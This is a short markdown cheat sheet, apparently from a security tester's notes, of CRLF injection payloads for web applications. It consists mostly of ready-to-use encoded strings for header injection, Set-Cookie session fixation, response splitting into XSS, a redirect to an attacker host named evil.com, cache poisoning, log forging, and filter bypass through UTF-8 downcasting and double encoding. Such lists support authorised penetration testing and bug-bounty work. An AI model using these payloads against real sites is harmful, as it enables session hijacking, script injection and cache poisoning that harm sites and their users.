---
title: "Payloads: CRLF Injection"
type: payloads
tags: [payloads, crlf, header-injection, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Payloads: CRLF Injection

Inject CR/LF into header-reflected values (OWASP A03). See [[crlf-injection]].

## Detect (reflected into a header?)
```
%0d%0aFoobar:%20test        -> response has "Foobar: test" header
%0aFoobar:%20test           (LF only - some servers)
%0d%0a / %0D%0A / \r\n
```
Sinks: `Location` (redirects), `Set-Cookie`, reflected params, `?url=/?redirect=/?next=`.

## Header injection / cookie / fixation
```
val%0d%0aSet-Cookie:%20admin=true
val%0d%0aSet-Cookie:%20sessionid=ATTACKER
```

## Split into body -> XSS
```
/%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<svg/onload=alert(document.domain)>
/%0d%0a%0d%0a<script>alert(1)</script>
```

## Open redirect / cache poison / log forge
```
%0d%0aLocation:%20https://evil.com
%0d%0a%0d%0a  + cacheable response -> poison (see web-cache)
%0d%0a injected fake log line (log forging / injection)
```

## Filter bypass (UTF-8 downcast)
```
%E5%98%8A = CR-ish (嘊)   %E5%98%8D = LF-ish (嘍)   # servers that strip high bytes -> CR/LF
%E5%98%8A%E5%98%8DSet-Cookie:%20x=1
double-encode: %250d%250a
```

## Real-world
CRLF in `Location`/redirect params escalates to reflected XSS, session fixation, and (on cacheable responses) cache poisoning - a long-running bug-bounty class in proxies and frameworks that did not strip CR/LF.
